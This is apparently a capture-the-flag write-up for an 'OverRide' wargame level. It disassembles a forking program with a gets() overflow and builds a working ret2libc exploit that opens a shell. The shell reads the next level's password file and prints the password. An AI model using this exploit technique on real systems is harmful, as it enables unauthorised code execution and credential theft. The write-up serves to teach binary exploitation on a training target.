# Level 04

## GDB Utils

The program only call a main :

```
(gdb) disas main
Dump of assembler code for function main:
   0x080486c8 <+0>:     push   %ebp
   0x080486c9 <+1>:     mov    %esp,%ebp
   0x080486cb <+3>:     push   %edi
   0x080486cc <+4>:     push   %ebx
   0x080486cd <+5>:     and    $0xfffffff0,%esp
   0x080486d0 <+8>:     sub    $0xb0,%esp
   0x080486d6 <+14>:    call   0x8048550 <fork@plt>
   0x080486db <+19>:    mov    %eax,0xac(%esp)
   0x080486e2 <+26>:    lea    0x20(%esp),%ebx
   0x080486e6 <+30>:    mov    $0x0,%eax
   0x080486eb <+35>:    mov    $0x20,%edx
   0x080486f0 <+40>:    mov    %ebx,%edi
   0x080486f2 <+42>:    mov    %edx,%ecx
   0x080486f4 <+44>:    rep stos %eax,%es:(%edi)
   0x080486f6 <+46>:    movl   $0x0,0xa8(%esp)
   0x08048701 <+57>:    movl   $0x0,0x1c(%esp)
   0x08048709 <+65>:    cmpl   $0x0,0xac(%esp)
   0x08048711 <+73>:    jne    0x8048769 <main+161>
   0x08048713 <+75>:    movl   $0x1,0x4(%esp)
   0x0804871b <+83>:    movl   $0x1,(%esp)
   0x08048722 <+90>:    call   0x8048540 <prctl@plt>
   0x08048727 <+95>:    movl   $0x0,0xc(%esp)
   0x0804872f <+103>:   movl   $0x0,0x8(%esp)
   0x08048737 <+111>:   movl   $0x0,0x4(%esp)
   0x0804873f <+119>:   movl   $0x0,(%esp)
   0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:   movl   $0x8048903,(%esp)
   0x08048752 <+138>:   call   0x8048500 <puts@plt>
   0x08048757 <+143>:   lea    0x20(%esp),%eax
   0x0804875b <+147>:   mov    %eax,(%esp)
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>
   0x08048763 <+155>:   jmp    0x804881a <main+338>
   0x08048768 <+160>:   nop
   0x08048769 <+161>:   lea    0x1c(%esp),%eax
   0x0804876d <+165>:   mov    %eax,(%esp)
   0x08048770 <+168>:   call   0x80484f0 <wait@plt>
   0x08048775 <+173>:   mov    0x1c(%esp),%eax
   0x08048779 <+177>:   mov    %eax,0xa0(%esp)
   0x08048780 <+184>:   mov    0xa0(%esp),%eax
   0x08048787 <+191>:   and    $0x7f,%eax
   0x0804878a <+194>:   test   %eax,%eax
   0x0804878c <+196>:   je     0x80487ac <main+228>
   0x0804878e <+198>:   mov    0x1c(%esp),%eax
   0x08048792 <+202>:   mov    %eax,0xa4(%esp)
   0x08048799 <+209>:   mov    0xa4(%esp),%eax
   0x080487a0 <+216>:   and    $0x7f,%eax
   0x080487a3 <+219>:   add    $0x1,%eax
   0x080487a6 <+222>:   sar    %al
   0x080487a8 <+224>:   test   %al,%al
   0x080487aa <+226>:   jle    0x80487ba <main+242>
   0x080487ac <+228>:   movl   $0x804891d,(%esp)
   0x080487b3 <+235>:   call   0x8048500 <puts@plt>
   0x080487b8 <+240>:   jmp    0x804881a <main+338>
   0x080487ba <+242>:   movl   $0x0,0xc(%esp)
   0x080487c2 <+250>:   movl   $0x2c,0x8(%esp)
   0x080487ca <+258>:   mov    0xac(%esp),%eax
   0x080487d1 <+265>:   mov    %eax,0x4(%esp)
   0x080487d5 <+269>:   movl   $0x3,(%esp)
   0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:   mov    %eax,0xa8(%esp)
   0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp)
   0x080487f0 <+296>:   jne    0x8048768 <main+160>
   0x080487f6 <+302>:   movl   $0x8048931,(%esp)
   0x080487fd <+309>:   call   0x8048500 <puts@plt>
   0x08048802 <+314>:   movl   $0x9,0x4(%esp)
   0x0804880a <+322>:   mov    0xac(%esp),%eax
   0x08048811 <+329>:   mov    %eax,(%esp)
   0x08048814 <+332>:   call   0x8048520 <kill@plt>
   0x08048819 <+337>:   nop
   0x0804881a <+338>:   mov    $0x0,%eax
   0x0804881f <+343>:   lea    -0x8(%ebp),%esp
   0x08048822 <+346>:   pop    %ebx
   0x08048823 <+347>:   pop    %edi
   0x08048824 <+348>:   pop    %ebp
   0x08048825 <+349>:   ret
```

Lets see what IDA tells :


```c
#include <stdint.h>

int32_t main(int32_t argc, char **argv, char **envp)
{
    pid_t pid = fork();
    void var_a0;
    void *edi = &var_a0;

    for (int32_t ecx = 0x20; ecx != 0; ecx = (ecx - 1))
    {
        *edi = 0;
        edi = (edi + 4);
    }

    int32_t var_a4 = 0;
    if (pid == 0)
    {
        prctl(PR_SET_DUMPABLE, PR_DUMPABLE);
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        puts("Give me some shellcode, k");
        gets(&var_a0);
    }

    else
    {
        while (true)
        {
            wait(&var_a4);
            if (((var_a4 & 0x7f) != 0 && (((var_a4 & 0x7f) + 1) >> 1) <= 0))
            {
                if (ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0) == 0xb)
                {
                    puts("no exec() for you");
                    kill(pid, 9);
                    break;
                }
                continue;
            }
            puts("child is exiting...");
            break;
        }
    }
    return 0;
}
```

This one is really tricky, there is a very easy to spot vulnerability, since there is a gets() function call, we have a buffer to overflow.

So we can insert shellcode or do other exploit.

But the overflow is happening a child, and the parents is using wait() in order to wait for the child.


Lets test the binary

```sh
level04@OverRide:~$ ./level04
Give me some shellcode, k
hey
child is exiting...
level04@OverRide:~$ ./level04
Give me some shellcode, k
dddddddddddddddddddddddddddddddddddddddddddddddddddd
child is exiting...
level04@OverRide:~$
```

So we did undurstood good, the child is awaiting in the gets() call, and the parent is awaiting the child in the wait() call, and when we give our input the programs end.

But when we cause a segfault to the child, this happen :

```sh
level04@OverRide:~$ python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'" | ./level04
Give me some shellcode, k
ew
ewq
eqw

qwe
```

Here i tried to overflow the buffer, but nothing happen, the only way to quit the program is so to trigger a SIGQUIT or a SIGINT.

We think that its probably the fact that the child segfaulted, and the parent is still waiting.

So in order to find our EIP and other stuff to execute a shell to that binary, we are going to need to activate this option in GDB.

```
set follow-fork-mode child
```

This way we can see what's happening to the child.

```sh
(gdb) set follow-fork-mode child
(gdb) run < /tmp/offset
Starting program: /home/users/level04/level04 < /tmp/offset
[New process 2141]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2141]
0x41326641 in ?? ()
(gdb)
```

Now this is clear, and by using an offset tool we can confirm that the offset to the EIP is 156 byte.

Lets try to make a ret2libc exploit on it.

Lets gather the address we need :

```sh
(gdb) br main
Breakpoint 1 at 0x80486cd
(gdb) run
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc map
process 2145
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
         0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb)
```

And execute it :

```sh
level04@OverRide:~$ (python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + 'AAAA' + '\xec\x97\xf8\xf7'") | ./level04
Give me some shellcode, k
ls
id
^C
level04@OverRide:~$ (python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + 'AAAA' + '\xec\x97\xf8\xf7'"; cat) | ./level04
Give me some shellcode, k
ls
ls: cannot open directory .: Permission denied
id
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

And it worked !